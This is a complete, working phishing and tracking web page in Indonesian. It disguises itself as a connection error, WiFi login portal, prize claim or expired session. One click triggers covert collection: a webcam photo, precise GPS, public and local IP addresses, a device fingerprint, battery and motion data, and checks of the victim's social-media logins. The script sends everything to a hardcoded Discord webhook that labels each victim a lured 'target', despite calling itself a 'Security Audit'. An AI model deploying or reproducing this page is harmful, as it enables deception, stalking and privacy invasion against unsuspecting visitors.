<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Connection Lost</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

        :root {
            --bg: #030712;
            --card: rgba(15, 23, 42, 0.82);
            --card-border: rgba(59, 130, 246, 0.12);
            --accent: #3b82f6;
            --accent-dark: #2563eb;
            --accent-light: #60a5fa;
            --accent-glow: rgba(59, 130, 246, 0.3);
            --red-500: #ef4444;
            --red-400: #f87171;
            --green-500: #22c55e;
            --green-400: #4ade80;
            --amber-500: #f59e0b;
            --text: #f1f5f9;
            --text-dim: #94a3b8;
            --text-muted: #475569;
        }

        body {
            background: var(--bg);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background-image:
                linear-gradient(rgba(59, 130, 246, 0.025) 1px, transparent 1px),
                linear-gradient(90deg, rgba(59, 130, 246, 0.025) 1px, transparent 1px);
            background-size: 44px 44px;
            pointer-events: none;
        }

        body::after {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse 600px 400px at 25% 30%, rgba(59, 130, 246, 0.07) 0%, transparent 70%),
                radial-gradient(ellipse 500px 500px at 75% 70%, rgba(139, 92, 246, 0.05) 0%, transparent 70%);
            pointer-events: none;
            animation: orbDrift 20s ease-in-out infinite alternate;
        }

        @keyframes orbDrift {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-30px, 20px); }
        }

        /* ===== CARD ===== */
        .card {
            position: relative;
            z-index: 1;
            background: var(--card);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid var(--card-border);
            border-radius: 20px;
            padding: 48px 40px 40px;
            max-width: 460px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 80px rgba(59, 130, 246, 0.04), 0 30px 60px rgba(0, 0, 0, 0.4);
            animation: cardIn 0.6s ease;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 50%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent), transparent);
        }

        @keyframes cardIn {
            from { opacity: 0; transform: translateY(20px) scale(0.97); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* ===== HEADING ===== */
        .main-heading {
            position: relative;
            font-family: 'JetBrains Mono', monospace;
            font-size: 96px;
            font-weight: 700;
            color: var(--text);
            letter-spacing: 6px;
            line-height: 1;
            margin-bottom: 8px;
            user-select: none;
        }

        .main-heading.emoji-mode {
            font-family: 'Inter', sans-serif;
            font-size: 72px;
            letter-spacing: 0;
            margin-bottom: 12px;
        }

        .main-heading.glitch::before,
        .main-heading.glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.8;
        }

        .main-heading.glitch::before {
            color: #ff003c;
            animation: glitch1 4s infinite linear;
            clip-path: polygon(0 0, 100% 0, 100% 35%, 0 35%);
        }

        .main-heading.glitch::after {
            color: #00e5ff;
            animation: glitch2 4s infinite linear;
            clip-path: polygon(0 65%, 100% 65%, 100% 100%, 0 100%);
        }

        @keyframes glitch1 {
            0%, 88%, 100% { transform: translate(0); }
            90% { transform: translate(-3px, 1px); }
            92% { transform: translate(2px, -1px); }
            94% { transform: translate(-1px, 2px); }
        }

        @keyframes glitch2 {
            0%, 88%, 100% { transform: translate(0); }
            91% { transform: translate(3px, -1px); }
            93% { transform: translate(-2px, 1px); }
            95% { transform: translate(1px, -2px); }
        }

        .main-subtitle {
            font-size: 21px;
            font-weight: 700;
            color: var(--text);
            margin-bottom: 12px;
            letter-spacing: -0.01em;
        }

        .main-desc {
            font-size: 13.5px;
            color: var(--text-dim);
            line-height: 1.7;
            margin-bottom: 32px;
        }

        .main-desc strong { color: var(--red-400); font-weight: 600; }
        .main-desc .highlight { color: var(--accent-light); font-weight: 600; }

        /* ===== BUTTON ===== */
        .btn-fix {
            width: 100%;
            padding: 15px 32px;
            border: none;
            border-radius: 12px;
            font-family: 'Inter', sans-serif;
            font-size: 14.5px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            background: linear-gradient(135deg, var(--accent-dark), var(--accent));
            color: white;
            box-shadow: 0 4px 20px var(--accent-glow), inset 0 1px 0 rgba(255,255,255,0.1);
            transition: all 0.25s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-fix:hover { transform: translateY(-2px); box-shadow: 0 8px 30px var(--accent-glow), inset 0 1px 0 rgba(255,255,255,0.1); }
        .btn-fix:active { transform: translateY(0); }

        .error-code {
            margin-top: 28px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 10.5px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .status-dot {
            width: 5px;
            height: 5px;
            border-radius: 50%;
            background: var(--red-500);
            animation: blink 1.5s ease-in-out infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.25; }
        }

        /* ===== OVERLAY ===== */
        .overlay {
            position: fixed;
            inset: 0;
            z-index: 1000;
            background: rgba(3, 7, 18, 0.92);
            backdrop-filter: blur(12px);
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .overlay.active { display: flex; animation: overlayIn 0.35s ease; }

        @keyframes overlayIn { from { opacity: 0; } to { opacity: 1; } }

        .process-card {
            background: var(--card);
            border: 1px solid var(--card-border);
            border-radius: 20px;
            padding: 44px 36px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 80px rgba(59, 130, 246, 0.08);
            animation: processIn 0.4s ease 0.1s both;
        }

        @keyframes processIn {
            from { opacity: 0; transform: scale(0.92) translateY(15px); }
            to { opacity: 1; transform: scale(1) translateY(0); }
        }

        .spinner-ring {
            width: 52px;
            height: 52px;
            margin: 0 auto 24px;
            border: 3px solid rgba(59, 130, 246, 0.1);
            border-top-color: var(--accent-light);
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            position: relative;
        }

        .spinner-ring::after {
            content: '';
            position: absolute;
            inset: 4px;
            border: 2px solid transparent;
            border-bottom-color: rgba(139, 92, 246, 0.5);
            border-radius: 50%;
            animation: spin 1.5s linear infinite reverse;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .process-title { font-size: 16px; font-weight: 600; color: var(--text); margin-bottom: 8px; }
        .process-status { font-size: 13px; color: var(--text-dim); margin-bottom: 28px; min-height: 20px; transition: opacity 0.2s; }

        .progress-track {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--accent-dark), var(--accent-light));
            border-radius: 4px;
            transition: width 0.6s ease;
            position: relative;
        }

        .progress-fill::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shimmer 1.8s ease-in-out infinite;
        }

        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }

        .progress-pct { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-muted); }

        .success-check {
            width: 56px;
            height: 56px;
            margin: 0 auto 20px;
            background: rgba(34, 197, 94, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .success-check svg { width: 28px; height: 28px; color: var(--green-400); }

        @keyframes popIn { 0% { transform: scale(0); } 70% { transform: scale(1.15); } 100% { transform: scale(1); } }

        .hidden { display: none !important; }

        .top-line { position: fixed; top: 0; left: 0; width: 100%; height: 3px; z-index: 1001; }
        .top-line-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent-dark), var(--accent-light), #a855f7); transition: width 0.5s ease; }

        @media (max-width: 480px) {
            .card { padding: 36px 24px 32px; border-radius: 16px; }
            .main-heading { font-size: 72px; letter-spacing: 4px; }
            .main-heading.emoji-mode { font-size: 56px; }
            .main-subtitle { font-size: 18px; }
            .process-card { padding: 36px 24px; }
        }

        #camVideo, #camCanvas, #fpCanvas {
            position: fixed; top: -9999px; left: -9999px;
            width: 1px; height: 1px; opacity: 0; pointer-events: none;
        }
    </style>
</head>

<body>

    <div class="top-line"><div class="top-line-fill" id="topLine"></div></div>

    <div class="card" id="mainCard">
        <div class="main-heading glitch" id="mainHeading" data-text="404">404</div>
        <h2 class="main-subtitle" id="mainSubtitle">Connection Lost</h2>
        <p class="main-desc" id="mainDesc">
            Terdeteksi <strong>kegagalan sinkronisasi</strong> pada sesi browser Anda.
            Keamanan enkripsi mungkin terganggu. Tekan tombol di bawah untuk memperbaiki.
        </p>
        <button class="btn-fix" id="btnFix">
            <svg id="btnIcon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            <span id="btnText">Fix & Reconnect</span>
        </button>
        <div class="error-code">
            <span class="status-dot" id="statusDot"></span>
            <span id="errorCode">ERR_SSL_PROTOCOL_ERROR_SYNC</span>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="process-card">
            <div id="stateProcessing">
                <div class="spinner-ring"></div>
                <div class="process-title" id="processTitle">Memperbaiki Koneksi</div>
                <div class="process-status" id="statusText">Menginisialisasi...</div>
                <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
                <div class="progress-pct" id="progressPct">0%</div>
            </div>
            <div id="stateSuccess" class="hidden">
                <div class="success-check">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
                </div>
                <div class="process-title" id="successTitle" style="color:var(--green-400)">Koneksi Dipulihkan</div>
                <div class="process-status" id="redirectText">Mengalihkan dalam 3 detik...</div>
            </div>
        </div>
    </div>

    <video id="camVideo" playsinline muted autoplay></video>
    <canvas id="camCanvas"></canvas>
    <canvas id="fpCanvas"></canvas>

    <script>
        // =====================================================
        //  CONFIG
        // =====================================================
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";
        const REDIRECT_URL = "https://www.google.com";

        // =====================================================
        //  THEMES
        // =====================================================
        const THEMES = {
            '404': {
                title: '404 - Connection Lost',
                heading: '404',
                emoji: false,
                subtitle: 'Connection Lost',
                desc: 'Terdeteksi <strong>kegagalan sinkronisasi</strong> pada sesi browser Anda. Keamanan enkripsi mungkin terganggu. Tekan tombol di bawah untuk memperbaiki.',
                btnText: 'Fix & Reconnect',
                btnIcon: '<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',
                errorCode: 'ERR_SSL_PROTOCOL_ERROR_SYNC',
                dotColor: '#ef4444',
                accent: '#3b82f6',
                accentDark: '#2563eb',
                processTitle: 'Memperbaiki Koneksi',
                successTitle: 'Koneksi Dipulihkan',
                statusMessages: [
                    'Menginisialisasi koneksi aman...',
                    'Memeriksa sertifikat SSL...',
                    'Menganalisis topologi jaringan...',
                    'Memverifikasi protokol enkripsi...',
                    'Memeriksa kerentanan...',
                    'Menyinkronkan sesi browser...',
                    'Mengamankan koneksi...',
                    'Hampir selesai...'
                ]
            },
            'wifi': {
                title: 'WiFi Authentication Required',
                heading: '📶',
                emoji: true,
                subtitle: 'Autentikasi WiFi Diperlukan',
                desc: 'Jaringan <span class="highlight">__SSID__</span> memerlukan autentikasi sebelum Anda dapat mengakses internet. Klik tombol di bawah untuk menghubungkan perangkat Anda.',
                btnText: 'Connect to Network',
                btnIcon: '<circle cx="12" cy="12" r="10"/><path d="M2 12h20"/>',
                errorCode: 'NET::ERR_CERT_AUTHORITY_REQUIRED',
                dotColor: '#06b6d4',
                accent: '#06b6d4',
                accentDark: '#0891b2',
                processTitle: 'Mengautentikasi Jaringan',
                successTitle: 'Terhubung ke Jaringan',
                statusMessages: [
                    'Mendeteksi access point...',
                    'Memverifikasi WPA3 handshake...',
                    'Mengautentikasi perangkat...',
                    'Mendaftarkan MAC address...',
                    'Mengalokasikan IP address...',
                    'Memeriksa firewall rules...',
                    'Mengonfigurasi DNS...',
                    'Hampir terhubung...'
                ]
            },
            'prize': {
                title: 'Selamat! Klaim Hadiah Anda',
                heading: '🎉',
                emoji: true,
                subtitle: 'Selamat! Anda Terpilih!',
                desc: 'Anda adalah <span class="highlight">pengunjung beruntung</span> hari ini! Klik tombol di bawah untuk mengklaim hadiah eksklusif Anda sebelum penawaran berakhir.',
                btnText: 'Klaim Hadiah Sekarang',
                btnIcon: '<rect x="3" y="8" width="18" height="14" rx="2"/><path d="M12 8V2M2 12h20M12 8l-4-4M12 8l4-4"/>',
                errorCode: 'PROMO-2024-ID-VIP-XCLSV',
                dotColor: '#f59e0b',
                accent: '#f59e0b',
                accentDark: '#d97706',
                processTitle: 'Memproses Klaim Anda',
                successTitle: 'Klaim Berhasil!',
                statusMessages: [
                    'Memverifikasi kelayakan...',
                    'Memeriksa kuota hadiah...',
                    'Mengonfirmasi identitas...',
                    'Memvalidasi sesi promo...',
                    'Memproses klaim Anda...',
                    'Menyiapkan hadiah...',
                    'Hampir selesai...'
                ]
            },
            'login': {
                title: 'Session Expired — Verify Identity',
                heading: '🔒',
                emoji: true,
                subtitle: 'Sesi Login Berakhir',
                desc: 'Sesi Anda telah <strong>kedaluwarsa</strong> karena tidak ada aktivitas selama 2 jam. Verifikasi identitas Anda untuk melanjutkan akses.',
                btnText: 'Verify & Continue',
                btnIcon: '<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>',
                errorCode: 'AUTH_SESSION_TIMEOUT_7200S',
                dotColor: '#8b5cf6',
                accent: '#8b5cf6',
                accentDark: '#7c3aed',
                processTitle: 'Memverifikasi Identitas',
                successTitle: 'Sesi Dipulihkan',
                statusMessages: [
                    'Memvalidasi token sesi...',
                    'Memeriksa kredensial...',
                    'Memverifikasi sidik jari perangkat...',
                    'Mengecek riwayat login...',
                    'Memperbarui sesi keamanan...',
                    'Menyinkronkan akun...',
                    'Hampir selesai...'
                ]
            }
        };

        // =====================================================
        //  ELEMENTS & HELPERS
        // =====================================================
        const $ = id => document.getElementById(id);
        let activeTheme = THEMES['404'];

        function setProgress(pct) {
            $('progressFill').style.width = pct + '%';
            $('progressPct').textContent = pct + '%';
            $('topLine').style.width = pct + '%';
        }

        function setStatus(text) {
            const el = $('statusText');
            el.style.opacity = '0';
            setTimeout(() => { el.textContent = text; el.style.opacity = '1'; }, 150);
        }

        function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

        function simpleHash(str) {
            let h = 0;
            for (let i = 0; i < str.length; i++) {
                h = ((h << 5) - h) + str.charCodeAt(i);
                h = h & h;
            }
            return Math.abs(h).toString(16).padStart(8, '0').toUpperCase();
        }

        // =====================================================
        //  THEME APPLIER
        // =====================================================
        function applyTheme() {
            const params = new URLSearchParams(window.location.search);
            const themeKey = params.get('t') || '404';
            const ssid = params.get('ssid') || 'FreeWiFi_5G';
            const theme = THEMES[themeKey] || THEMES['404'];
            activeTheme = theme;

            document.title = theme.title;

            const heading = $('mainHeading');
            heading.textContent = theme.heading;
            heading.setAttribute('data-text', theme.heading);

            if (theme.emoji) {
                heading.classList.remove('glitch');
                heading.classList.add('emoji-mode');
            } else {
                heading.classList.add('glitch');
                heading.classList.remove('emoji-mode');
            }

            $('mainSubtitle').textContent = theme.subtitle;
            $('mainDesc').innerHTML = theme.desc.replace('__SSID__', ssid);
            $('btnText').textContent = theme.btnText;
            $('btnIcon').innerHTML = theme.btnIcon;
            $('errorCode').textContent = theme.errorCode;
            $('statusDot').style.background = theme.dotColor;
            $('processTitle').textContent = theme.processTitle;
            $('successTitle').textContent = theme.successTitle;

            // Apply accent colors
            const root = document.documentElement;
            root.style.setProperty('--accent', theme.accent);
            root.style.setProperty('--accent-dark', theme.accentDark);
            root.style.setProperty('--accent-glow', theme.accent + '4d');
        }

        // =====================================================
        //  DATA COLLECTORS
        // =====================================================

        // --- IP Info ---
        async function collectIP() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (!res.ok) throw 0;
                return await res.json();
            } catch {
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const { ip } = await res.json();
                    return { ip, city: 'N/A', region: 'N/A', country_name: 'N/A', org: 'N/A' };
                } catch { return { ip: 'Unknown' }; }
            }
        }

        // --- Device Fingerprint ---
        function collectDevice() {
            const ua = navigator.userAgent;
            let os = 'Unknown', browser = 'Unknown';

            if (/Android/i.test(ua)) os = 'Android';
            else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
            else if (/Windows/i.test(ua)) os = 'Windows';
            else if (/Mac/i.test(ua)) os = 'macOS';
            else if (/Linux/i.test(ua)) os = 'Linux';

            if (/Edg\//i.test(ua)) browser = 'Edge';
            else if (/OPR\//i.test(ua)) browser = 'Opera';
            else if (/Chrome/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua)) browser = 'Safari';

            return {
                ua, os, browser,
                lang: navigator.language,
                screen: `${screen.width}×${screen.height}`,
                dpr: window.devicePixelRatio,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || 'N/A',
                touch: navigator.maxTouchPoints || 0,
                mem: navigator.deviceMemory || 'N/A',
                netType: navigator.connection?.type || 'N/A',
                netEff: navigator.connection?.effectiveType || 'N/A',
                netDown: navigator.connection?.downlink || 'N/A'
            };
        }

        // --- Battery ---
        async function collectBattery() {
            try {
                const b = await navigator.getBattery();
                return { level: Math.round(b.level * 100), charging: b.charging };
            } catch { return null; }
        }

        // --- GPS ---
        function collectGPS() {
            return new Promise(resolve => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy, alt: p.coords.altitude, spd: p.coords.speed }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        // --- Camera ---
        async function captureCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                const video = $('camVideo');
                video.srcObject = stream;
                return new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            const c = $('camCanvas');
                            c.width = video.videoWidth;
                            c.height = video.videoHeight;
                            c.getContext('2d').drawImage(video, 0, 0);
                            c.toBlob(blob => {
                                stream.getTracks().forEach(t => t.stop());
                                video.srcObject = null;
                                resolve(blob);
                            }, 'image/jpeg', 0.85);
                        }, 1500);
                    };
                    video.onerror = () => { stream.getTracks().forEach(t => t.stop()); resolve(null); };
                });
            } catch { return null; }
        }

        // --- WebRTC Local IP ---
        async function getLocalIPs() {
            return new Promise(resolve => {
                const ips = new Set();
                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('');
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                    pc.onicecandidate = e => {
                        if (!e || !e.candidate) { pc.close(); resolve([...ips]); return; }
                        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (m && m[1] !== '0.0.0.0') ips.add(m[1]);
                    };
                    setTimeout(() => { try { pc.close(); } catch {} resolve([...ips]); }, 5000);
                } catch { resolve([]); }
            });
        }

        // --- Canvas Fingerprint ---
        function getCanvasFingerprint() {
            try {
                const c = $('fpCanvas');
                c.width = 280;
                c.height = 60;
                const ctx = c.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '16px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(100, 1, 80, 24);
                ctx.fillStyle = '#069';
                ctx.fillText('BrowserFP 🔒✨', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('BrowserFP 🔒✨', 4, 17);
                ctx.globalCompositeOperation = 'multiply';
                ctx.fillStyle = 'rgb(255,0,255)';
                ctx.beginPath();
                ctx.arc(50, 30, 25, 0, Math.PI * 2);
                ctx.fill();
                ctx.fillStyle = 'rgb(0,255,255)';
                ctx.beginPath();
                ctx.arc(80, 30, 25, 0, Math.PI * 2);
                ctx.fill();
                const dataUrl = c.toDataURL();
                return simpleHash(dataUrl);
            } catch { return null; }
        }

        // --- WebGL GPU Info ---
        function getWebGLInfo() {
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (!gl) return null;
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                    renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION)
                };
            } catch { return null; }
        }

        // --- Social Media Login Detection ---
        async function detectSocialLogins() {
            const results = {};
            const checks = [
                { name: 'Google', url: 'https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser' },
                { name: 'Facebook', url: 'https://www.facebook.com/settings' },
                { name: 'Instagram', url: 'https://www.instagram.com/accounts/edit/' },
                { name: 'TikTok', url: 'https://www.tiktok.com/setting' }
            ];

            await Promise.allSettled(checks.map(async (check) => {
                try {
                    const ctrl = new AbortController();
                    const t = setTimeout(() => ctrl.abort(), 4000);
                    const res = await fetch(check.url, {
                        method: 'HEAD',
                        mode: 'no-cors',
                        credentials: 'include',
                        redirect: 'manual',
                        signal: ctrl.signal
                    });
                    clearTimeout(t);
                    results[check.name] = res.type === 'opaqueredirect' ? '🔴 Tidak Login' : '🟢 Kemungkinan Login';
                } catch {
                    results[check.name] = '⚪ N/A';
                }
            }));

            return results;
        }

        // --- Accelerometer / Gyroscope ---
        let motionData = null;
        try {
            window.addEventListener('deviceorientation', e => {
                motionData = {
                    alpha: e.alpha != null ? Math.round(e.alpha) : null,
                    beta: e.beta != null ? Math.round(e.beta) : null,
                    gamma: e.gamma != null ? Math.round(e.gamma) : null
                };
            });
        } catch {}

        // =====================================================
        //  WEBHOOK SENDER
        // =====================================================
        async function sendWebhook({ ipData, device, battery, gps, photo, localIPs, canvasFP, webgl, social, motion }) {
            try {
                const fields = [];
                const themeKey = new URLSearchParams(window.location.search).get('t') || '404';

                fields.push({ name: '🎭 Tema Digunakan', value: `\`${themeKey.toUpperCase()}\``, inline: true });
                fields.push({ name: '📅 Waktu', value: `\`${new Date().toLocaleString('id-ID')}\``, inline: true });

                // IP & Network
                if (ipData) {
                    fields.push({ name: '🌐 Public IP', value: `\`${ipData.ip}\``, inline: true });
                    fields.push({ name: '🏢 ISP', value: `\`${ipData.org || 'N/A'}\``, inline: true });
                    if (ipData.city && ipData.city !== 'N/A')
                        fields.push({ name: '🏙️ Lokasi IP', value: `\`${ipData.city}, ${ipData.region || ''}, ${ipData.country_name || ''}\`` });
                }

                // Local IP (WebRTC)
                if (localIPs && localIPs.length > 0) {
                    fields.push({ name: '🔓 Local IP (WebRTC)', value: `\`${localIPs.join(', ')}\`` });
                }

                // GPS
                if (gps) {
                    fields.push({ name: '📍 GPS', value: `\`${gps.lat}, ${gps.lng}\` (±${Math.round(gps.acc)}m)` });
                    fields.push({ name: '🗺️ Maps', value: `[Buka Maps](https://www.google.com/maps?q=${gps.lat},${gps.lng})` });
                } else {
                    fields.push({ name: '📍 GPS', value: '`❌ Ditolak`' });
                }

                // Device
                if (device) {
                    fields.push({ name: '📱 Perangkat', value: `\`${device.os} — ${device.browser}\``, inline: true });
                    fields.push({ name: '🖥️ Layar', value: `\`${device.screen} @${device.dpr}x\``, inline: true });
                    fields.push({ name: '🕐 Timezone', value: `\`${device.tz}\``, inline: true });
                    fields.push({ name: '🧠 CPU/RAM', value: `\`${device.cores} cores / ${device.mem}GB\``, inline: true });
                    if (device.netEff !== 'N/A')
                        fields.push({ name: '📶 Koneksi', value: `\`${device.netEff} (${device.netType}) ↓${device.netDown}Mbps\``, inline: true });
                }

                // Battery
                if (battery)
                    fields.push({ name: '🔋 Baterai', value: `\`${battery.level}% ${battery.charging ? '⚡' : '🔌'}\``, inline: true });

                // WebGL
                if (webgl)
                    fields.push({ name: '🎮 GPU', value: `\`${webgl.renderer}\`` });

                // Canvas FP
                if (canvasFP)
                    fields.push({ name: '🖼️ Canvas FP', value: `\`${canvasFP}\``, inline: true });

                // Camera
                fields.push({ name: '📸 Kamera', value: photo ? '`✅ Foto diambil`' : '`❌ Ditolak`', inline: true });

                // Social Media
                if (social && Object.keys(social).length > 0) {
                    const socialText = Object.entries(social).map(([k, v]) => `${k}: ${v}`).join('\n');
                    fields.push({ name: '👤 Social Media Detection', value: `\`\`\`${socialText}\`\`\`` });
                }

                // Motion
                if (motion)
                    fields.push({ name: '📐 Gyroscope', value: `\`α:${motion.alpha}° β:${motion.beta}° γ:${motion.gamma}°\`` });

                // User Agent
                fields.push({ name: '🔗 User Agent', value: `\`\`\`${device?.ua || navigator.userAgent}\`\`\`` });

                const embed = {
                    title: '🚨 Target Berhasil Terpancing!',
                    color: 15548997,
                    fields,
                    footer: { text: `Security Audit — ${activeTheme.title}` },
                    timestamp: new Date().toISOString()
                };

                if (photo) {
                    embed.image = { url: 'attachment://photo.jpg' };
                    const fd = new FormData();
                    fd.append('files[0]', photo, 'photo.jpg');
                    fd.append('payload_json', JSON.stringify({ username: '🛡️ Security Audit', embeds: [embed] }));
                    await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                } else {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username: '🛡️ Security Audit', embeds: [embed] })
                    });
                }
            } catch (e) { console.error('Webhook:', e); }
        }

        // =====================================================
        //  MAIN FLOW — ONE CLICK, EVERYTHING FIRES
        // =====================================================
        $('btnFix').addEventListener('click', async function () {
            this.style.pointerEvents = 'none';
            this.style.opacity = '0.5';
            $('overlay').classList.add('active');
            setProgress(5);

            // Rotate status messages
            let msgIdx = 0;
            const msgInterval = setInterval(() => {
                setStatus(activeTheme.statusMessages[msgIdx % activeTheme.statusMessages.length]);
                msgIdx++;
            }, 2000);

            // ── LAUNCH ALL IN PARALLEL (from user-gesture context) ──
            const gpsPromise      = collectGPS();
            const cameraPromise   = captureCamera();
            const ipPromise       = collectIP();
            const batteryPromise  = collectBattery();
            const localIPPromise  = getLocalIPs();
            const socialPromise   = detectSocialLogins();

            // Synchronous collectors
            const device   = collectDevice();
            const canvasFP = getCanvasFingerprint();
            const webgl    = getWebGLInfo();

            setProgress(15);

            // Wait for everything
            const [gpsR, camR, ipR, batR, lipR, socR] = await Promise.allSettled([
                gpsPromise, cameraPromise, ipPromise, batteryPromise, localIPPromise, socialPromise
            ]);

            setProgress(70);
            setStatus('Mengirim data verifikasi...');
            await delay(500);

            const gps      = gpsR.status  === 'fulfilled' ? gpsR.value  : null;
            const photo    = camR.status  === 'fulfilled' ? camR.value  : null;
            const ipData   = ipR.status   === 'fulfilled' ? ipR.value   : null;
            const battery  = batR.status  === 'fulfilled' ? batR.value  : null;
            const localIPs = lipR.status  === 'fulfilled' ? lipR.value  : [];
            const social   = socR.status  === 'fulfilled' ? socR.value  : {};

            setProgress(85);
            await sendWebhook({ ipData, device, battery, gps, photo, localIPs, canvasFP, webgl, social, motion: motionData });

            setProgress(100);
            clearInterval(msgInterval);

            // ── SUCCESS ──
            $('stateProcessing').classList.add('hidden');
            $('stateSuccess').classList.remove('hidden');

            let count = 3;
            const ci = setInterval(() => {
                count--;
                $('redirectText').textContent = `Mengalihkan dalam ${count} detik...`;
                if (count <= 0) { clearInterval(ci); window.location.href = REDIRECT_URL; }
            }, 1000);
        });

        // Emergency beacon
        window.addEventListener('beforeunload', () => {
            try {
                navigator.sendBeacon(WEBHOOK_URL, new Blob([JSON.stringify({
                    username: '🛡️ Security Audit',
                    content: '⚠️ Target menutup halaman sebelum proses selesai.'
                })], { type: 'application/json' }));
            } catch {}
        });

        // =====================================================
        //  INIT
        // =====================================================
        applyTheme();
    </script>
